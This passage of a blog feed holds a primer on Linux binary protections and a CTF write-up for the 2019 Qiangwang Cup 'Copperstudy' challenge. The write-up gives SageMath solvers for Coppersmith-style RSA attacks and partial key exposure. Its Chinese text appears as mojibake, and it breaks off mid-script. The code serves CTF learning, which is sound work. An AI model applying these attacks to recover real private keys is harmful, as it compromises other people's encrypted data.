        </tags>
      
    </entry>
    
    <entry>
      <title>Binary_Security_Guidance</title>
      <link href="/2019/07/18/Binary-Security-Guidance/"/>
      <url>/2019/07/18/Binary-Security-Guidance/</url>
      
        <content type="html"><![CDATA[<p>Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specificallyğŸ˜„.</p><a id="more"></a><p>[TOC]</p><h1 id="âœ‰Binary-Security-Guidance"><a href="#âœ‰Binary-Security-Guidance" class="headerlink" title="âœ‰Binary_Security_Guidance"></a>âœ‰Binary_Security_Guidance</h1><blockquote><p>Binary security refers to guaranteeing the information security of binary data when transmitting data, that is, not being tampered with, decoded and so on. If attacked, it can be detected in time.</p><p>Binary security includes some things of cryptography, such as encryption and decryption, signature and so on.</p><p>In <code>CTF</code> competitions, binary security usually appear in the form of <code>reverse</code> and <code>pwn</code>. You will get a compiled program to analyze its logic and then crack it.</p></blockquote><h2 id="ğŸ“–Linux-Pwn"><a href="#ğŸ“–Linux-Pwn" class="headerlink" title="ğŸ“–Linux Pwn"></a>ğŸ“–Linux Pwn</h2><blockquote><p>Cause pwn of linux is normally favorite example form now. So i decide to start pwn from linux platform.</p></blockquote><h3 id="Security-protection-mechanism"><a href="#Security-protection-mechanism" class="headerlink" title="Security protection mechanism"></a>Security protection mechanism</h3><blockquote><p>In the linux, we can use instructions called <code>checksec</code> to see the security protection mechanism of our target program. So the first we should know is kinds of protection mechanism.</p></blockquote><p> <img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718144432.png" alt=""></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><blockquote><p>Canary is a kind of protection technique to mitigate stack overflow.</p><p>You can set the canary by following args.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Quoted From CTF-WIKI</span><span class="token comment" spellcheck="true">#enables protection, but only inserts protection for functions that have arrays in local variables</span>-fstack-protector <span class="token comment" spellcheck="true">#Enable protection, insert protection for all functions</span>-fstack-protector-all -fstack-protector-strong<span class="token comment" spellcheck="true">#Only protects functions with explicit stack_protect attribute</span>-fstack-protector-explicit <span class="token comment" spellcheck="true">#Disable protection.</span>-fno-stack-protector </code></pre><p>Here is a example to understand what role canary play.</p><pre class=" language-bash"><code class="language-bash">        High        Address <span class="token operator">|</span>                 <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> args            <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>                +-----------------+        rbp <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>                +-----------------+      rbp-8 <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>                +-----------------+<span class="token operator">|</span> Local variables <span class="token operator">|</span>        Low     <span class="token operator">|</span>                 <span class="token operator">|</span>        Address</code></pre><p>The canary value is usually stored in <code>TLS==&gt;fs:[0x28]</code>, this value is also called <code>stack_guard</code>. If the canary value was changed illegally, the program flow will go to a func called <code>__stack_chk_fail</code> in glibc. And then you canâ€™t crack the program as you think, it will prevent the easy stack overflow.(PS: Bypass Canary will be talked laterâ€¦)</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote><p>Nx(No Excute) enabled means instructions in stack wonâ€™t be allowed to execute. Normally attack ways like <code>call esp</code> and <code>jmp esp</code> will out of action. But we can use ROP technique to bypass NX. </p></blockquote><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><blockquote><p>RELRO, this kind of protection mechanism has two form: <code>Partial RELRO</code> and <code>Full RELRO</code>. If program was Full RELRO, we wouldnâ€™t change the <code>Got-table</code>.</p></blockquote><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><blockquote><p>PIEï¼ˆposition-independent executableï¼‰ enabled means programâ€™s memory address is random while running the program each time.</p><p>The basic address is 0x400000 when programâ€™s status is <code>No-PIE</code>.</p></blockquote><h4 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h4><blockquote><p>Has RWX(Read&amp;Write&amp;Execute) segments means program has some segments you have the power to read, write and execute.</p><p>You can try to understand it by following picture:</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718153217.png" alt=""></p><h3 id="Common-Attack-Ways"><a href="#Common-Attack-Ways" class="headerlink" title="Common Attack Ways"></a>Common Attack Ways</h3><blockquote><p>So what we should learn then? Itâ€™s no denying we should aim at understanding basic principles of common attack ways. </p></blockquote><ul><li>Stack overflow</li><li>Format string vulnerability</li><li>Glibc Heap uses</li><li>IO_FILE uses</li><li>Conditional competition</li><li>Integer overflow</li><li>Sandbox escape</li><li>Linux Kernel</li><li>Others Framework(like arm,arch)</li></ul><h2 id="ğŸ“–Reverse"><a href="#ğŸ“–Reverse" class="headerlink" title="ğŸ“–Reverse"></a>ğŸ“–Reverse</h2><p>laterâ€¦</p><h2 id="â±Concluding-remarks"><a href="#â±Concluding-remarks" class="headerlink" title="â±Concluding remarks"></a>â±Concluding remarks</h2><p>Fighting or losing, depend on yourselfğŸ˜€.</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019å¼ºç½‘æ¯_Copperstudy</title>
      <link href="/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
      <url>/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/</url>
      
        <content type="html"><![CDATA[<p>ä¸€é“RSAè¿‡ä¸€éå„ç§æ”»å‡»ã€‚</p><a id="more"></a><p>[TOC]</p><h1 id="ğŸš©2019å¼ºç½‘æ¯-Copperstudy"><a href="#ğŸš©2019å¼ºç½‘æ¯-Copperstudy" class="headerlink" title="ğŸš©2019å¼ºç½‘æ¯_Copperstudy"></a>ğŸš©2019å¼ºç½‘æ¯_Copperstudy</h1><blockquote><p>ğŸ˜­å¡åœ¨ç¬¬äº”å…³ï¼Œä¸€çœ‹wpå‘ç°å°‘copyäº†ä¸€ä¸ªnï¼Œä»¥ä¸ºæœ‰nå’Œmä¸¤ä¸ªæœªçŸ¥æ•°ï¼ˆps:sageçœŸå¼ºå¤§ï¼‰ã€‚</p></blockquote><h2 id="âœ…Challenge-0"><a href="#âœ…Challenge-0" class="headerlink" title="âœ…Challenge 0"></a>âœ…Challenge 0</h2><p>åªéœ€çˆ†ç ´å¾—å‡ºskrçš„å€¼ï¼Œè¿™æ˜¯é—¨æ§›ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="âœ…Challenge-1"><a href="#âœ…Challenge-1" class="headerlink" title="âœ…Challenge 1"></a>âœ…Challenge 1</h2><p>å¯†æ–‡é«˜ä½å·²çŸ¥ï¼ŒæœªçŸ¥ä½æ¯”ç‰¹æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bitsæœªçŸ¥</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="âœ…Challenge-2"><a href="#âœ…Challenge-2" class="headerlink" title="âœ…Challenge 2"></a>âœ…Challenge 2</h2><p>å·²çŸ¥éƒ¨åˆ†å› æ•°é«˜Bitï¼ŒæœªçŸ¥ä½æ¯”ç‰¹æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="âœ…Challenge-3"><a href="#âœ…Challenge-3" class="headerlink" title="âœ…Challenge 3"></a>âœ…Challenge 3</h2><p>å·²çŸ¥éƒ¨åˆ†ç§é’¥ï¼Œä½†ç§é’¥é«˜æ¯”ç‰¹æœªçŸ¥ï¼ŒPartial Key Exposure Attack(éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»)ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 